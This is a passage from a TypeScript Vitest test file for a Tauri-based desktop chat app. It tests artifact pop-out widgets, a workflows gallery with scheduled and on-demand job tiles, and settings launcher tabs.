      expect(invokeMock).toHaveBeenCalledWith('open_artifact_widget', {
        artifactId: 'pin-pop',
        title: 'deploy.sh',
        x: 180,
        y: 160,
      })
    })

    it('(f) pop-out button on a session artifact PINS it, then opens the widget; no-ops without Tauri', async () => {
      const m = M()

      // Part 1 — with Tauri present.
      const invokeMock = vi.fn(async (cmd: string) =>
        cmd === 'list_widget_windows' ? [] : undefined)
      ;(window as any).__TAURI__ = {
        ...(window as any).__TAURI__,
        core: { invoke: invokeMock },
      }

      m.ArtifactsEngine.openPanel()
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted', threadId: 't', messageId: 'msg-pop', messageSeq: 0,
        artifacts: [
          { id: 'msg-pop:0', source: 'code-fence', path: null, lang: 'py',
            title: 'snippet.py', content: 'print(1)' },
        ],
      })

      const sessionList = document.getElementById('artifacts-session-list')!
      const popBtn = sessionList.querySelector('[data-action="pop-out"]') as HTMLButtonElement
      expect(popBtn).not.toBeNull()

      popBtn.click()
      await vi.advanceTimersByTimeAsync(1)

      // Widget windows render PINNED artifacts: popping out a session row
      // pins it first (artifact-pin rides the WS), then opens cascaded.
      expect(invokeMock).toHaveBeenCalledWith('open_artifact_widget', {
        artifactId: 'msg-pop:0',
        title: 'snippet.py',
        x: 180,
        y: 160,
      })

      // Part 2 — without Tauri (browser env): clicking must NOT throw.
      ;(window as any).__TAURI__ = undefined
      m.ArtifactsEngine.applySession({
        type: 'artifacts-extracted', threadId: 't', messageId: 'msg-pop2', messageSeq: 1,
        artifacts: [
          { id: 'msg-pop2:0', source: 'code-fence', path: null, lang: 'ts',
            title: 'foo.ts', content: 'const x = 1' },
        ],
      })
      const popBtn2 = sessionList.querySelector('[data-action="pop-out"]:last-of-type') as HTMLButtonElement
      // Clicking should not throw even without Tauri.
      expect(() => { popBtn2?.click() }).not.toThrow()
    })
  })

  // Behavioral Feature: Workflows gallery panel (PRD Part C W3)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Workflows gallery', () => {
    const M = () => (window as any).__MoonInternals
    const sentFrames: any[] = []

    beforeEach(() => {
      sentFrames.length = 0
      const m = M()
      m.WebSocketEngine.send = (f: any) => { sentFrames.push(f) }
      m.State.ws = { readyState: WebSocket.OPEN }
      m.State.serverSupportsWorkflows = false
      m.State.workflows = []
      m.State.workflowRuns = {}
      m.State.selectedWorkflowId = null
      m.State.workflowsPanelOpen = false
      // Ensure panel and button are hidden at start of each test.
      const panel = document.getElementById('workflows-panel')
      if (panel) panel.hidden = true
      const btn = document.getElementById('workflows-btn')
      if (btn) (btn as HTMLElement).hidden = true
    })

    it('(a) applyList populates State and render() builds tiles with correct schedule/on-demand badges', () => {
      const m = M()
      m.WorkflowsEngine.openPanel()

      m.WorkflowsEngine.applyList([
        {
          id: 'job-1', kind: 'cron', label: 'Nightly Digest',
          source: 'server', schedule: '0 3 * * *', onDemand: false,
          enabled: true, nextRunAt: Date.now() + 3_600_000, lastRun: null,
          lastStatus: 'success', createdAt: Date.now(),
        },
        {
          id: 'job-2', kind: 'manual', label: 'On-Demand Report',
          source: 'server', schedule: null, onDemand: true,
          enabled: true, nextRunAt: null, lastRun: Date.now() - 60_000,
          lastStatus: null, createdAt: Date.now(),
        },
      ])

      expect(m.State.workflows).toHaveLength(2)

      const tiles = document.querySelectorAll('#workflows-list .workflow-tile')
      expect(tiles.length).toBe(2)

      // First tile: scheduled badge contains the cron expression.
      expect(tiles[0]!.textContent).toContain('Nightly Digest')
      const badge0 = tiles[0]!.querySelector('.workflow-tile-badge') as HTMLElement
      expect(badge0).not.toBeNull()
      expect(badge0!.textContent).toContain('scheduled')
      expect(badge0!.textContent).toContain('0 3 * * *')

      // Second tile: on-demand badge.
      expect(tiles[1]!.textContent).toContain('On-Demand Report')
      const badge1 = tiles[1]!.querySelector('.workflow-tile-badge') as HTMLElement
      expect(badge1!.textContent).toContain('on-demand')
    })

    it('(b) select(jobId) sets selectedWorkflowId and sends a workflow-runs-request frame', () => {
      const m = M()
      m.WorkflowsEngine.openPanel()

      m.WorkflowsEngine.applyList([
        {
          id: 'job-x', kind: 'cron', label: 'Daily Job',
          source: 'server', schedule: '0 8 * * *', onDemand: false,
          enabled: true, nextRunAt: null, lastRun: null, lastStatus: null,
          createdAt: Date.now(),
        },
      ])

      // Click the tile to select it.
      const tile = document.querySelector('#workflows-list .workflow-tile') as HTMLElement
      expect(tile).not.toBeNull()
      tile.click()

      expect(m.State.selectedWorkflowId).toBe('job-x')
      expect(sentFrames).toHaveLength(1)
      expect(sentFrames[0]).toMatchObject({ type: 'workflow-runs-request', jobId: 'job-x' })
    })

    it('(c) applyCapability(false) hides the header button and clears workflows state', () => {
      const m = M()

      // Seed state: capability on, some workflows, a selection.
      m.WorkflowsEngine.applyCapability(true)
      m.WorkflowsEngine.applyList([
        {
          id: 'job-z', kind: 'cron', label: 'Weekly Sync',
          source: 'server', schedule: '0 0 * * 0', onDemand: false,
          enabled: true, nextRunAt: null, lastRun: null, lastStatus: 'success',
          createdAt: Date.now(),
        },
      ])
      m.State.workflowRuns['job-z'] = [
        { id: 'run-1', startedAt: Date.now() - 5000, finishedAt: Date.now(), status: 'success', attempt: 1, error: null },
      ]
      m.State.selectedWorkflowId = 'job-z'
      m.WorkflowsEngine.openPanel()

      expect(m.State.workflows).toHaveLength(1)
      expect(m.State.workflowsPanelOpen).toBe(true)
      expect((document.getElementById('workflows-btn') as HTMLElement).hidden).toBe(false)

      // Drive the capability flag through the REAL path (the hello handler) so
      // the assertion below is not vacuous (applyCapability itself does not set
      // serverSupportsWorkflows — review G3).
      m.WebSocketEngine.handleFrame({
        type: 'hello',
        protocolVersion: 2,
        kinds: [],
        capabilities: { chat: true, streamingDeltas: true, setup: false },
      })

      expect(m.State.serverSupportsWorkflows).toBe(false)
      expect(m.State.workflows).toHaveLength(0)
      expect(m.State.selectedWorkflowId).toBeNull()
      expect(m.State.workflowsPanelOpen).toBe(false)
      expect((document.getElementById('workflows-btn') as HTMLElement).hidden).toBe(true)
    })
  })

  // ───────────────────────────────────────────────────────────────────────────
  // Behavioral Feature: Settings tabs that migrated to system widgets (Phase 2)
  // ───────────────────────────────────────────────────────────────────────────
  describe('Feature: Settings panel launchers', () => {
    it('clicking the Updates tab opens the settings.updates panel and closes the modal', async () => {
      // The launcher reads window.__TAURI__.core at CLICK time, so injecting
      // the mock after boot exercises the real handler path.
      const invoke = vi.fn(async () => 'panel-settings-updates')
      ;(window as any).__TAURI__.core = { invoke }

      const settingsPanel = document.getElementById('settings-panel') as HTMLElement
      settingsPanel.classList.add('active') // modal open
      const tab = document.querySelector('[data-panel-kind="settings.updates"]') as HTMLElement
      expect(tab).toBeTruthy()
      tab.click()

      expect(invoke).toHaveBeenCalledWith('open_widget', { kind: 'settings.updates' })
      expect(settingsPanel.classList.contains('active')).toBe(false)
      // The launcher tab must NOT have stolen tabpanel selection: no
      // tabpanel is associated with it, so the active one stays put.
      expect(document.querySelector('.settings-tabpanel[data-tabpanel="updates"]')).toBeNull()
    })

    it('launcher degrades to a no-op off-Tauri (no core) without throwing', () => {
      delete ((window as any).__TAURI__ as any).core
      const settingsPanel = document.getElementById('settings-panel') as HTMLElement
      settingsPanel.classList.add('active')
      const tab = document.querySelector('[data-panel-kind="settings.updates"]') as HTMLElement
      expect(() => tab.click()).not.toThrow()
      expect(settingsPanel.classList.contains('active')).toBe(false)
    })
  })
})
